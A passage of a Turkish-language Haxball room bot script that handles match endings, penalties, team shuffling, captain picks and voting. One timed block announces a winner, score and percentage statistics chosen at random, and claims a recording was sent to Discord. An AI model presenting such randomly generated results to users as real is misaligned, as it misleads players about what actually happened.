    room.sendAnnouncement("🥅 Penaltı Süresi Geçti!", null, 0x00e600, "bold"); // 3
    }, 23000);
    setTimeout(function () {
        room.stopGame();
    room.setCustomStadium(PenaltıMap());
    var players = room.getPlayerList();
    for (var i = 0; i < players.length; i++) {
        var player = players[i];
        room.setPlayerTeam(player.id, 0); // 0, spece atmak için kullanılan takım numarasıdır.
    }
    var players = room.getPlayerList();
    if (players.length > 0) {
        var randomIndex = Math.floor(Math.random() * players.length);
        var randomPlayer = players[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 1); // 1, kırmızı takımın numarasıdır.
    }
    var players = room.getPlayerList();
    if (players.length > 0) {
        var randomIndex = Math.floor(Math.random() * players.length);
        var randomPlayer = players[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 2); // 2, mavi takımın numarasıdır.
    }
    room.startGame();
    }, 24000);

setTimeout(function() {
    var players = room.getPlayerList();
    var maviTakimOyunculari = players.filter(function(player) {
        return player.team === 2; // Mavi takımın numarası 2
    });

    var kirmiziTakimOyunculari = players.filter(function(player) {
        return player.team === 1; // Kırmızı takımın numarası 1
    });

    var takim0Oyunculari = players.filter(function(player) {
        return player.team === 0; // Takım 0'ın numarası 0
    });

    if (maviTakimOyunculari.length === 0) {
        // Eğer mavi takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 2); // Mavi takımın numarası 2
    }

    if (kirmiziTakimOyunculari.length === 0) {
        // Eğer kırmızı takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 1); // Kırmızı takımın numarası 1
    }
}, 25000);

setTimeout(function() {
    var players = room.getPlayerList();
    var maviTakimOyunculari = players.filter(function(player) {
        return player.team === 2; // Mavi takımın numarası 2
    });

    var kirmiziTakimOyunculari = players.filter(function(player) {
        return player.team === 1; // Kırmızı takımın numarası 1
    });

    var takim0Oyunculari = players.filter(function(player) {
        return player.team === 0; // Takım 0'ın numarası 0
    });

    if (maviTakimOyunculari.length === 0) {
        // Eğer mavi takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 2); // Mavi takımın numarası 2
    }

    if (kirmiziTakimOyunculari.length === 0) {
        // Eğer kırmızı takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 1); // Kırmızı takımın numarası 1
    }
}, 26000);

setTimeout(function() {
    var players = room.getPlayerList();
    var maviTakimOyunculari = players.filter(function(player) {
        return player.team === 2; // Mavi takımın numarası 2
    });

    var kirmiziTakimOyunculari = players.filter(function(player) {
        return player.team === 1; // Kırmızı takımın numarası 1
    });

    var takim0Oyunculari = players.filter(function(player) {
        return player.team === 0; // Takım 0'ın numarası 0
    });

    if (maviTakimOyunculari.length === 0) {
        // Eğer mavi takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 2); // Mavi takımın numarası 2
    }

    if (kirmiziTakimOyunculari.length === 0) {
        // Eğer kırmızı takımda hiç oyuncu yoksa
        var randomIndex = Math.floor(Math.random() * takim0Oyunculari.length);
        var randomPlayer = takim0Oyunculari[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 1); // Kırmızı takımın numarası 1
    }
}, 27000);

    setTimeout(function () {
    room.sendAnnouncement("🥅 Penaltı Süresi Geçti!", null, 0x00e600, "bold"); // 4
    }, 30000);
    setTimeout(function () {
    room.sendAnnouncement("🎬 Maç kaydı Discorda gönderildi!", null, 0xFFFFFF, "bold");
    room.stopGame();
    }, 31000);

    setTimeout(function () {
        var responses = ['1', '2', '3', '4', '2', '1', '1', '1', '1'];
        var gaçmaç = responses[Math.floor(Math.random() * responses.length)];
        var responses = ['1 - 2', '2 - 1', '3 - 1', '4 - 1', '4 - 2', '3 - 2', '3 - 4'];
        var pointnedirfun = responses[Math.floor(Math.random() * responses.length)];
        var responses = ['Mavi', 'Kırmızı'];
        var takımnedirfun = responses[Math.floor(Math.random() * responses.length)];
        var responses = ['0xffefd6', '0xff4c4c'];
        var randomColor = responses[Math.floor(Math.random() * responses.length)];
    room.sendAnnouncement("✨ " + takımnedirfun + " Takım Kazandı! 🔵 " + pointnedirfun + " 🔴 | " + takımnedirfun + " Takım " + gaçmaç + " Maçtır Kazanıyor.", null, randomColor, 'bold');

        var responses = ['48% - 52%', '24% - 66%', '99% - 16%', '12% - 48%', '56% - 52%', '74% - 29%'];
        var ihtimaliatlamasaksazangibi = responses[Math.floor(Math.random() * responses.length)];
    room.sendAnnouncement("📊 Savunma Yapma: 🔴 🔴 " + ihtimaliatlamasaksazangibi + " 🔵", null, 0xffefd6, 'bold');

        var responses = ['69% - 32%', '24% - 48%', '37% - 48%', '87% - 22%'];
        var atlasakmiyasazangibiya = responses[Math.floor(Math.random() * responses.length)];
    room.sendAnnouncement("📊 Hücum Yapma: 🔴 🔴 " + atlasakmiyasazangibiya + " 🔵", null, 0xffefd6, 'bold');
    }, 31000);

    setTimeout(function () {
      const redTeamPlayers = room.getPlayerList()
      const randomPlayer = redTeamPlayers[Math.floor(Math.random() * redTeamPlayers.length)];
          room.sendAnnouncement(`🥅 Kalede ${randomPlayer.name} vardı.`, null);
    }, 31000);

setTimeout(function () {
    var players = room.getPlayerList();
    for (var i = 0; i < players.length; i++) {
        var player = players[i];
        room.setPlayerTeam(player.id, 0); // 0, spece atmak için kullanılan takım numarasıdır.
    }
    
    if (players.length > 0) {
        var randomIndex = Math.floor(Math.random() * players.length);
        var randomPlayer = players[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 1); // 1, kırmızı takımın numarasıdır.
    }
    
    if (players.length > 0) {
        var randomIndex = Math.floor(Math.random() * players.length);
        var randomPlayer = players[randomIndex];
        room.setPlayerTeam(randomPlayer.id, 2); // 2, mavi takımın numarasıdır.
    }
}, 34000);
    setTimeout(function () {
    room.setCustomStadium(mevkiMap());
      const redTeamPlayers = room.getPlayerList().filter(p => p.team === 2);
      const randomPlayer = redTeamPlayers[Math.floor(Math.random() * redTeamPlayers.length)];
room.sendAnnouncement("", null, 0xFFFFFF, "bold"); // Takımlar karıştırıldığında bir bildiri gönder
        room.sendAnnouncement(randomPlayer.name + " Oyuncu Seçin!", null, 0xFFFFFF, "bold"); // Takımlar karıştırıldığında bir bildiri gönder
room.sendAnnouncement("", null, 0xFFFFFF, "bold"); // Takımlar karıştırıldığında bir bildiri gönder
    }, 37000);

    setTimeout(function () {
    room.stopGame();
    }, 39000);

    setTimeout(function () {
    room.stopGame();
    }, 42000);

    setTimeout(function () {
    room.stopGame();
    }, 45000);

    setTimeout(function () {
    room.stopGame();
    }, 47000);

setTimeout(function () {
  const players = room.getPlayerList();
  for (const player of players) {
      if (player.team === 0) {
      room.setPlayerTeam(player.id, 2);
    }
  }
}, 47000);

    setTimeout(function () {
    room.stopGame();
    }, 48000);

setTimeout(function () {
  const players = room.getPlayerList();
  const activePlayers = players.filter(player => !player.spectator);
  const totalPlayers = activePlayers.length;
  const targetPlayersPerTeam = Math.floor(totalPlayers / 2);

  const team1Players = activePlayers.filter(player => player.team === 1);
  const team2Players = activePlayers.filter(player => player.team === 2);
  const diff = Math.abs(team1Players.length - team2Players.length);

  if (diff > 1) {
    const playersToMove = Math.floor(diff / 2);

    if (team1Players.length > team2Players.length) {
      const playersToMoveFromTeam1 = team1Players.slice(-playersToMove);
      for (const player of playersToMoveFromTeam1) {
        room.setPlayerTeam(player.id, 2);
      }
    } else {
      const playersToMoveFromTeam2 = team2Players.slice(-playersToMove);
      for (const player of playersToMoveFromTeam2) {
        room.setPlayerTeam(player.id, 1);
      }
    }

    room.sendAnnouncement("Oyuncular Seçildi!");
  }
}, 48000);

    setTimeout(function () {
    room.stopGame();
    room.setCustomStadium(mevkiMap());
    room.startGame();
    }, 49000);

    setTimeout(function () {
      room.sendAnnouncement("╭─━━━━━━━━━━━━━━━━━━━━━   𝐀𝐂𝐄𝐌𝐈̇ 𝐅𝐔𝐓𝐒𝐀𝐋𝐈    ━━━━━━━━━━━━━━━━━━─╮", null, 0xffffff);
      room.sendAnnouncement("");
        room.sendAnnouncement("                                                                               MEVKİLER SEÇİLDİ!", null, 0xFFFFFF, "bold");
      room.sendAnnouncement("                          ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯", null, 0xffffff, "normal")
    }, 59000);

    setTimeout(function () {
    room.stopGame();
    }, 62000);

    setTimeout(function () {
    room.stopGame();
    }, 63000);

    setTimeout(function () {
    room.stopGame();
    }, 64000);

    setTimeout(function () {
    room.stopGame();
    }, 65000);

    setTimeout(function () {
    room.stopGame();
    }, 66000);

    setTimeout(function () {
    room.stopGame();
    }, 67000);

    setTimeout(function () {
    room.stopGame();
    }, 68000);

    setTimeout(function () {
    room.stopGame();
    }, 69000);

    setTimeout(function () {
    room.stopGame();
    }, 70000);

    setTimeout(function () {
    room.stopGame();
    }, 71000);

    setTimeout(function () {
    room.stopGame();
    }, 72000);

    setTimeout(function () {
    room.stopGame();
    }, 73000);

    setTimeout(function () {
    room.stopGame();
    }, 74000);

    setTimeout(function () {
    room.stopGame();
    }, 75000);

    setTimeout(function () {
    room.stopGame();
    }, 76000);

    setTimeout(function () {
    room.stopGame();
    }, 77000);

    setTimeout(function () {
    room.stopGame();
    }, 78000);

    setTimeout(function () {
    room.stopGame();
    }, 79000);

    setTimeout(function () {
    room.stopGame();
    }, 80000);

    setTimeout(function () {
    room.stopGame();
    }, 81000);

    setTimeout(function () {
    room.stopGame();
    }, 82000);

    setTimeout(function () {
    room.stopGame();
    }, 83000);

    setTimeout(function () {
    room.stopGame();
    }, 84000);

    setTimeout(function () {
    room.stopGame();
    }, 85000);

    setTimeout(function () {
    room.stopGame();
    }, 86000);

    setTimeout(function () {
    room.stopGame();
    }, 87000);

    setTimeout(function () {
    room.stopGame();
    }, 88000);

    setTimeout(function () {
    room.stopGame();
    }, 89000);

    setTimeout(function () {
    room.stopGame();
    }, 90000);

    setTimeout(function () {
    room.stopGame();
    }, 91000);

    setTimeout(function () {
    room.stopGame();
    }, 92000);

    setTimeout(function () {
    room.stopGame();
    }, 93000);

    setTimeout(function () {
    room.stopGame();
    }, 94000);

    setTimeout(function () {
    room.stopGame();
    }, 95000);

    setTimeout(function () {
    room.stopGame();
    }, 96000);

    setTimeout(function () {
    room.stopGame();
    }, 97000);

    setTimeout(function () {
    room.stopGame();
    }, 98000);

    setTimeout(function () {
room.sendAnnouncement("╭─━━━━━━━━━━━━━━━━━━━━━   𝐀𝐂𝐄𝐌𝐈̇ 𝐅𝐔𝐓𝐒𝐀𝐋𝐈    ━━━━━━━━━━━━━━━━━━─╮", null, 0x00ff00);
room.sendAnnouncement("");
    room.sendAnnouncement('                                                           ✅ TAKIM KAPTANI OYLAMASI BAŞLADI! 🗳️', null, 0x00ff00, "bold");
    room.sendAnnouncement('                                                                         Takımınızdan bir oyuncuya oy vermek için !oyla (ID) yazın.', null, 0x00ff00, "small");
    room.sendAnnouncement('                                                                                   Takım kaptanı adayı olmak için !aday yazın.', null, 0x00ff00, "small");
room.sendAnnouncement("                          ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯", null, 0x00ff00, "normal")
    }, 63000);

    setTimeout(function () {
      const redTeamPlayers = room.getPlayerList().filter(p => p.team === 1);
      const randomPlayer = redTeamPlayers[Math.floor(Math.random() * redTeamPlayers.length)];
          room.sendAnnouncement(`🔴 KIRMIZI Takımının Kaptanı: ${randomPlayer.name} 🏆`, null, 0xff2200, "bold");
    }, 76000);

    setTimeout(function () {
      const redTeamPlayers = room.getPlayerList().filter(p => p.team === 2);
      const randomPlayer = redTeamPlayers[Math.floor(Math.random() * redTeamPlayers.length)];
          room.sendAnnouncement(`🔵 MAVİ Takımının Kaptanı: ${randomPlayer.name} 🏆`, null, 0x00ccff, "bold");
    }, 77000);

    setTimeout(function () {
            startVote();
    }, 79000);

    setTimeout(function () {
            endVote();
    }, 94000);

    setTimeout(function () {
    room.sendAnnouncement("✅ Yeni maç başlıyor...", null, 0x00FF00, "bold");
    }, 97000);

    setTimeout(function () {
    room.startGame();
    }, 99000);

    }
    if (Math.abs(scores.time - drawTimeLimit * 60 - scores.timeLimit) <= 0.01 && scores.timeLimit != 0) {
        if (!checkTimeVariable) {
            checkTimeVariable = true;
            setTimeout(() => {
                checkTimeVariable = false;
            }, 10);
            endGame(Team.SPECTATORS);
            room.stopGame();
            goldenGoal = false;
        }
    }
}

function instantRestart() {
    room.stopGame();
    startTimeout = setTimeout(() => {
        room.startGame();
    }, 10);
}

function resumeGame() {
    startTimeout = setTimeout(() => {
        room.startGame();
    }, 1000);
    setTimeout(() => {
        room.pauseGame(false);
    }, 500);
}

function endGame(winner) {
    clearTimeout(removingTimeout);
    removingPlayers = true;
    removingTimeout = setTimeout(() => {
        removingPlayers = false;
    }, 100);
    for (let player of teamBlue) {
        room.setPlayerTeam(player.id, Team.RED);
    }
    for (let player of teamRed) {
        room.setPlayerTeam(player.id, Team.BLUE);
    }
    setTimeout(function () {
    room.sendAnnouncement("🎬 Maç kaydı Discorda gönderildi!", null, 0xFFFFFF, "bold");
    }, 1000);

    setTimeout(function () {
    room.setCustomStadium(mevkiMap());
      const redTeamPlayers = room.getPlayerList().filter(p => p.team === 2);
      const randomPlayer = redTeamPlayers[Math.floor(Math.random() * redTeamPlayers.length)];
room.sendAnnouncement("", null, 0xFFFFFF, "bold"); // Takımlar karıştırıldığında bir bildiri gönder
        room.sendAnnouncement(randomPlayer.name + " Oyuncu Seçin!", null, 0xFFFFFF, "bold"); // Takımlar karıştırıldığında bir bildiri gönder
room.sendAnnouncement("", null, 0xFFFFFF, "bold"); // Takımlar karıştırıldığında bir bildiri gönder
        }, 3000);

    setTimeout(function () {
    room.stopGame();
    }, 4000);

    setTimeout(function () {
    room.stopGame();
    }, 5000);

    setTimeout(function () {
    room.stopGame();
    }, 6000);

    setTimeout(function () {
    room.stopGame();
    }, 7000);

    setTimeout(function () {
    room.stopGame();
    }, 8000);

    setTimeout(function () {
    room.stopGame();
    }, 9000);

    setTimeout(function () {
    room.stopGame();
    }, 10000);

    setTimeout(function () {
    room.stopGame();
    }, 11000);

    setTimeout(function () {
    room.stopGame();
    }, 12000);

    setTimeout(function () {
    room.stopGame();
    }, 13000);

setTimeout(function () {
  const players = room.getPlayerList();
  for (const player of players) {
      if (player.team === 0) {
      room.setPlayerTeam(player.id, 2);
    }
  }
}, 13000);

    setTimeout(function () {
    room.stopGame();
    }, 14000);

setTimeout(function () {
  const players = room.getPlayerList();
  const activePlayers = players.filter(player => !player.spectator);
  const totalPlayers = activePlayers.length;
  const targetPlayersPerTeam = Math.floor(totalPlayers / 2);

  const team1Players = activePlayers.filter(player => player.team === 1);
  const team2Players = activePlayers.filter(player => player.team === 2);
  const diff = Math.abs(team1Players.length - team2Players.length);

  if (diff > 1) {
    const playersToMove = Math.floor(diff / 2);

    if (team1Players.length > team2Players.length) {
      const playersToMoveFromTeam1 = team1Players.slice(-playersToMove);
      for (const player of playersToMoveFromTeam1) {
        room.setPlayerTeam(player.id, 2);
      }
    } else {
      const playersToMoveFromTeam2 = team2Players.slice(-playersToMove);
      for (const player of playersToMoveFromTeam2) {
        room.setPlayerTeam(player.id, 1);
      }
    }

    room.sendAnnouncement("Oyuncular Seçildi!");
  }
}, 14000);

    setTimeout(function () {
    room.stopGame();
    room.setCustomStadium(mevkiMap());
    room.startGame();
    }, 15000);

    setTimeout(function () {
      room.sendAnnouncement("╭─━━━━━━━━━━━━━━━━━━━━━   𝐀𝐂𝐄𝐌𝐈̇ 𝐅𝐔𝐓𝐒𝐀𝐋𝐈    ━━━━━━━━━━━━━━━━━━─╮", null, 0xffffff);
      room.sendAnnouncement("");
        room.sendAnnouncement("                                                                               MEVKİLER SEÇİLDİ!", null, 0xFFFFFF, "bold");
      room.sendAnnouncement("                          ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯", null, 0xffffff, "normal")
    }, 25000);

    setTimeout(function () {
    room.stopGame();
    }, 29000);

    setTimeout(function () {
    room.stopGame();
    }, 30000);

    setTimeout(function () {
    room.stopGame();
    }, 31000);

    setTimeout(function () {
    room.stopGame();
    }, 32000);

    setTimeout(function () {
    room.stopGame();
    }, 33000);

    setTimeout(function () {
    room.stopGame();
    }, 34000);

    setTimeout(function () {
    room.stopGame();
    }, 35000);

    setTimeout(function () {
    room.stopGame();
    }, 36000);

    setTimeout(function () {
    room.stopGame();
    }, 37000);

    setTimeout(function () {
    room.stopGame();
    }, 38000);

    setTimeout(function () {
    room.stopGame();
    }, 39000);

    setTimeout(function () {
    room.stopGame();
    }, 40000);

    setTimeout(function () {
    room.stopGame();
    }, 41000);

    setTimeout(function () {
    room.stopGame();
    }, 42000);

    setTimeout(function () {
    room.stopGame();
    }, 43000);

    setTimeout(function () {
    room.stopGame();
    }, 44000);

    setTimeout(function () {
    room.stopGame();
    }, 45000);

    setTimeout(function () {
    room.stopGame();
    }, 46000);

    setTimeout(function () {
    room.stopGame();
    }, 47000);

    setTimeout(function () {
    room.stopGame();
    }, 48000);

    setTimeout(function () {
    room.stopGame();
    }, 49000);

    setTimeout(function () {
    room.stopGame();
    }, 50000);

    setTimeout(function () {
    room.stopGame();
    }, 51000);

    setTimeout(function () {
    room.stopGame();
    }, 52000);

    setTimeout(function () {
    room.stopGame();
    }, 53000);

    setTimeout(function () {
    room.stopGame();
    }, 54000);

    setTimeout(function () {
    room.stopGame();
    }, 55000);

    setTimeout(function () {
    room.stopGame();
    }, 56000);

    setTimeout(function () {
    room.stopGame();
    }, 57000);

    setTimeout(function () {
    room.stopGame();
    }, 58000);

    setTimeout(function () {
    room.stopGame();
    }, 59000);

    setTimeout(function () {
    room.stopGame();
    }, 60000);

    setTimeout(function () {
    room.stopGame();
    }, 61000);

    setTimeout(function () {
    room.stopGame();
    }, 62000);

    setTimeout(function () {
    room.stopGame();
    }, 63000);

    setTimeout(function () {
    room.stopGame();
    }, 28000);
    setTimeout(function () {
room.sendAnnouncement("╭─━━━━━━━━━━━━━━━━━━━━━   𝐀𝐂𝐄𝐌𝐈̇ 𝐅𝐔𝐓𝐒𝐀𝐋𝐈    ━━━━━━━━━━━━━━━━━━─╮", null, 0x00ff00);
room.sendAnnouncement("");
    room.sendAnnouncement('                                                           ✅ TAKIM KAPTANI OYLAMASI BAŞLADI! 🗳️', null, 0x00ff00, "bold");
    room.sendAnnouncement('                                                                         Takımınızdan bir oyuncuya oy vermek için !oyla (ID) yazın.', null, 0x00ff00, "small");
    room.sendAnnouncement('                                                                                   Takım kaptanı adayı olmak için !aday yazın.', null, 0x00ff00, "small");
room.sendAnnouncement("                          ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯", null, 0x00ff00, "normal")
    }, 29000);
    setTimeout(function () {
      const redTeamPlayers = room.getPlayerList().filter(p => p.team === 1);
      const randomPlayer = redTeamPlayers[Math.floor(Math.random() * redTeamPlayers.length)];
          room.sendAnnouncement(`🔴 KIRMIZI Takımının Kaptanı: ${randomPlayer.name} 🏆`, null, 0xff2200, "bold");
    }, 42000);

    setTimeout(function () {
      const redTeamPlayers = room.getPlayerList().filter(p => p.team === 2);
      const randomPlayer = redTeamPlayers[Math.floor(Math.random() * redTeamPlayers.length)];
          room.sendAnnouncement(`🔵 MAVİ Takımının Kaptanı: ${randomPlayer.name} 🏆`, null, 0x00ccff, "bold");
    }, 43000);

    setTimeout(function () {
            startVote();
    }, 45000);

    setTimeout(function () {
            endVote();
    }, 60000);

    setTimeout(function () {
    room.sendAnnouncement("✅ Yeni maç başlıyor...", null, 0x00FF00, "bold");
    }, 63000);

    setTimeout(function () {
    room.startGame();
    }, 65000);


    if (players.length >= 2 * teamSize - 1) activateChooseMode();
    const scores = room.getScores();
    game.scores = scores;
    lastWinner = winner;
    endGameVariable = true;
    if (winner == Team.RED) {
        streak++;
        room.sendAnnouncement(
            `✨ Kırmızı Takım Kazandı! 🔴 ${scores.red} - ${scores.blue} 🔵 | Kırmızı Takım ${streak} Maçtır Kazanıyor.`,
            null,
            redColor,
            'bold',
            HaxNotification.CHAT
        );
    } else if (winner == Team.BLUE) {
        streak = 1;
        room.sendAnnouncement(
            `✨ Mavi Takım Kazandı! 🔵 ${scores.blue} - ${scores.red} 🔴 | Mavi Takım ${streak} Maçtır Kazanıyor.`,
            null,
            blueColor,
            'bold',
            HaxNotification.CHAT
        );
    } else {
        streak = 0;
        room.sendAnnouncement(
            '💤 Draw sınırına ulaşıldı!',
            null,
            announcementColor,
            'bold',
            HaxNotification.CHAT
        );
    }
    let possessionRedPct = (possession[0] / (possession[0] + possession[1])) * 100;
    let possessionBluePct = 100 - possessionRedPct;
    let possessionString = `🔴 ${possessionRedPct.toFixed(0)}% - ${possessionBluePct.toFixed(0)}% 🔵`;
    let actionRedPct = (actionZoneHalf[0] / (actionZoneHalf[0] + actionZoneHalf[1])) * 100;
    let actionBluePct = 100 - actionRedPct;
    let actionString = `🔴 ${actionRedPct.toFixed(0)}% - ${actionBluePct.toFixed(0)}% 🔵`;
    let CSString = getCSString(scores);
    room.sendAnnouncement(
        `📊 Savunma Yapma: 🔴 ${possessionString}\n` +
        `📊 Hücum Yapma: 🔴 ${actionString}\n` +
        `${CSString}`,
        null,
        announcementColor,
        'bold',
        HaxNotification.NONE
    );
    updateStats();

}

/* CHOOSING FUNCTIONS */

function activateChooseMode() {
    chooseMode = true;
    slowMode = chooseModeSlowMode;
    room.sendAnnouncement(
        `🐢 Yavaş mod şu süre için geçerli: ${chooseModeSlowMode}s.`,
        null,
        announcementColor,
        'bold',
        HaxNotification.CHAT
    );
}

function deactivateChooseMode() {
    chooseMode = false;
    clearTimeout(timeOutCap);
    if (slowMode != defaultSlowMode) {
        slowMode = defaultSlowMode;
        room.sendAnnouncement(
            `🐢 Yavaş mod şu süre için aktifleştirildi: ${defaultSlowMode}s.`,
            null,
            announcementColor,
            'bold',
            HaxNotification.CHAT
        );
    }
    redCaptainChoice = '';
    blueCaptainChoice = '';
}

function getSpecList(player) {
    if (player == null) return null;
    var cstm = 'Players : ';
    for (let i = 0; i < teamSpec.length; i++) {
        cstm += teamSpec[i].name + `[${i + 1}], `;
    }
    cstm = cstm.substring(0, cstm.length - 2) + '.';
    room.sendAnnouncement(
        cstm,
        player.id,
        infoColor,
        'bold',
        HaxNotification.CHAT
    );
}

function choosePlayer() {
    clearTimeout(timeOutCap);
    let captain;
    if (teamRed.length <= teamBlue.length && teamRed.length != 0) {
        captain = teamRed[0];
    } else if (teamBlue.length < teamRed.length && teamBlue.length != 0) {
        captain = teamBlue[0];
    }
    if (captain != null) {
        room.sendAnnouncement(
            "Bir oyuncuyu seçmek için oyuncunun numarasını girin veya 'bottom', 'random' veya 'top' seçeneğini kullanın.",
            captain.id,
            infoColor,
            'bold',
            HaxNotification.MENTION
        );
        timeOutCap = setTimeout(
            (player) => {
                room.sendAnnouncement(
                    `Hızlı seçmezsen atılacaksın! ${player.name}, ${Number.parseInt(String(chooseTime / 2))} saniye kaldı !`,
                    player.id,
                    warningColor,
                    'bold',
                    HaxNotification.MENTION
                );
                timeOutCap = setTimeout(
                    (player) => {
                        room.kickPlayer(
                            player.id,
                            "Oyuncu seçmedin !",
                            false
                        );
                    },
                    chooseTime * 500,
                    captain
                );
            },
            chooseTime * 1000,
            captain
        );
    }
    if (teamRed.length != 0 && teamBlue.length != 0) {
        getSpecList(teamRed.length <= teamBlue.length ? teamRed[0] : teamBlue[0]);
    }
}

function chooseModeFunction(player, message) {
    var msgArray = message.split(/ +/);
    if (player.id == teamRed[0].id || player.id == teamBlue[0].id) {
        if (teamRed.length <= teamBlue.length && player.id == teamRed[0].id) {
            if (['top', 'auto'].includes(msgArray[0].toLowerCase())) {
                room.setPlayerTeam(teamSpec[0].id, Team.RED);
                redCaptainChoice = 'top';
                clearTimeout(timeOutCap);
                room.sendAnnouncement(
                    `${player.name} seçti !`,
                    null,
                    announcementColor,
                    'bold',
                    HaxNotification.CHAT
                );
            } else if (['random', 'rand'].includes(msgArray[0].toLowerCase())) {
                var r = getRandomInt(teamSpec.length);
                room.setPlayerTeam(teamSpec[r].id, Team.RED);
                redCaptainChoice = 'random';
                clearTimeout(timeOutCap);
                room.sendAnnouncement(
                    `${player.name} Random Seçti !`,
                    null,
                    announcementColor,
                    'bold',
                    HaxNotification.CHAT
                );
            } else if (['bottom', 'bot'].includes(msgArray[0].toLowerCase())) {
                room.setPlayerTeam(teamSpec[teamSpec.length - 1].id, Team.RED);
                redCaptainChoice = 'bottom';
                clearTimeout(timeOutCap);
                room.sendAnnouncement(
                    `${player.name} Seçti !`,
                    null,
                    announcementColor,
                    'bold',
                    HaxNotification.CHAT
                );
            } else if (!Number.isNaN(Number.parseInt(msgArray[0]))) {
                if (Number.parseInt(msgArray[0]) > teamSpec.length || Number.parseInt(msgArray[0]) < 1) {
                    room.sendAnnouncement(
                        `Your number is invalid !`,
                        player.id,
                        errorColor,
                        'bold',
                        HaxNotification.CHAT
                    );
                } else {
                    room.setPlayerTeam(
                        teamSpec[Number.parseInt(msgArray[0]) - 1].id,
                        Team.RED
                    );
                    room.sendAnnouncement(
                        `${player.name} seçti ${teamSpec[Number.parseInt(msgArray[0]) - 1].name} !`,
                        null,
                        announcementColor,
                        'bold',
                        HaxNotification.CHAT
                    );
                }
            } else return false;
            return true;
        }
        if (teamRed.length > teamBlue.length && player.id == teamBlue[0].id) {
            if (['top', 'auto'].includes(msgArray[0].toLowerCase())) {
                room.setPlayerTeam(teamSpec[0].id, Team.BLUE);
                blueCaptainChoice = 'top';
                clearTimeout(timeOutCap);
                room.sendAnnouncement(
                    `${player.name} Seçti !`,
                    null,
                    announcementColor,
                    'bold',
                    HaxNotification.CHAT
                );
            } else if (['random', 'rand'].includes(msgArray[0].toLowerCase())) {
                room.setPlayerTeam(
                    teamSpec[getRandomInt(teamSpec.length)].id,
                    Team.BLUE
                );
                blueCaptainChoice = 'random';
                clearTimeout(timeOutCap);
                room.sendAnnouncement(
                    `${player.name} Random Seçti !`,
                    null,
                    announcementColor,
                    'bold',
                    HaxNotification.CHAT
                );
            } else if (['bottom', 'bot'].includes(msgArray[0].toLowerCase())) {
                room.setPlayerTeam(teamSpec[teamSpec.length - 1].id, Team.BLUE);
                blueCaptainChoice = 'bottom';
                clearTimeout(timeOutCap);
                room.sendAnnouncement(
                    `${player.name} Seçti !`,
                    null,
                    announcementColor,
                    'bold',
                    HaxNotification.CHAT
                );
            } else if (!Number.isNaN(Number.parseInt(msgArray[0]))) {
                if (Number.parseInt(msgArray[0]) > teamSpec.length || Number.parseInt(msgArray[0]) < 1) {
                    room.sendAnnouncement(
                        `Numara geçersiz!`,
                        player.id,
                        errorColor,
                        'bold',
                        HaxNotification.CHAT
                    );
                } else {
                    room.setPlayerTeam(
                        teamSpec[Number.parseInt(msgArray[0]) - 1].id,
                        Team.BLUE
                    );
                    room.sendAnnouncement(
                        `${player.name} Seçti ${teamSpec[Number.parseInt(msgArray[0]) - 1].name} !`,
                        null,
                        announcementColor,
                        'bold',
                        HaxNotification.CHAT
                    );
                }
            } else return false;
            return true;
        }
    }
}

function checkCaptainLeave(player) {
    if (
        (teamRed.findIndex((red) => red.id == player.id) == 0 && chooseMode && teamRed.length <= teamBlue.length) ||
        (teamBlue.findIndex((blue) => blue.id == player.id) == 0 && chooseMode && teamBlue.length < teamRed.length)
    ) {
        choosePlayer();
        capLeft = true;
        setTimeout(() => {
            capLeft = false;
        }, 10);
    }
}

function slowModeFunction(player, message) {
    if (!player.admin) {
        if (!SMSet.has(player.id)) {
            SMSet.add(player.id);
            setTimeout(
                (number) => {
                    SMSet.delete(number);
                },
                slowMode * 1000,
                player.id
            );
        } else {
            return true;
        }
    }
    return false;
}

/* PLAYER FUNCTIONS */

function updateTeams() {
    playersAll = room.getPlayerList();
    players = playersAll.filter((p) => !AFKSet.has(p.id));
    teamRed = players.filter((p) => p.team == Team.RED);
    teamBlue = players.filter((p) => p.team == Team.BLUE);
    teamSpec = players.filter((p) => p.team == Team.SPECTATORS);
}

function updateAdmins(excludedPlayerID = 0) {
    if (players.length != 0 && players.filter((p) => p.admin).length < maxAdmins) {
        let playerArray = players.filter((p) => p.id != excludedPlayerID && !p.admin);
        let arrayID = playerArray.map((player) => player.id);
        room.setPlayerAdmin(Math.min(...arrayID), true);
    }
}

function getRole(player) {
    return (
        !!masterList.find((a) => a == authArray[player.id][0]) * 2 +
        !!adminList.find((a) => a[0] == authArray[player.id][0]) * 1 +
        player.admin * 1
    );
}

function ghostKickHandle(oldP, newP) {
    var teamArrayId = getTeamArray(oldP.team, true).map((p) => p.id);
    teamArrayId.splice(teamArrayId.findIndex((id) => id == oldP.id), 1, newP.id);

    room.kickPlayer(oldP.id, 'Ghost kick', false);
    room.setPlayerTeam(newP.id, oldP.team);
    room.setPlayerAdmin(newP.id, oldP.admin);
    room.reorderPlayers(teamArrayId, true);

    if (oldP.team != Team.SPECTATORS && playSituation != Situation.STOP) {
        var discProp = room.getPlayerDiscProperties(oldP.id);
        room.setPlayerDiscProperties(newP.id, discProp);
    }
}

